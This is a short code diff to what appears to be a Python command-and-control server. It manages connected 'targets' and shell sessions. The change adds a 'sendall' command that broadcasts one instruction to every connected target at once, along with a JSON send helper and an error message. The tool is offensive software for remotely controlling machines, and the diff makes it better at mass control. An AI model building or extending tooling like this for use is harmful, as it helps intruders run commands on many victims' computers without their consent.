@@ -26,10 +26,18 @@ OPTIONS:
     targets         --> shows connected targets
     session #       --> enters in session number #
     help            --> shows this help menu
+    sendall <cmd>   --> send same instruction to all targets
     quit            --> quit
 
 #########################################################################################
 '''
+
+
+def reliable_send_all(_target, _cmd):
+    if type(_cmd) is bytes:
+        _cmd = _cmd.decode('UTF-8')
+    json_data = json.dumps(_cmd)
+    _target.sendall(json_data.encode('UTF-8'))
 
 
 def shell(_s, _target, _addr):
@@ -161,7 +169,11 @@ def main():
                 shell(s, tarnum, tarip)
             except:
                 print('[!] No session under that number!')
+        elif cmd[:7] == 'sendall' and len(cmd[8:]) > 1:
+            for target in targets:
+                reliable_send_all(target, cmd[8:])
         else:
+            print('[!] Command does not exist!')
             continue
 
 
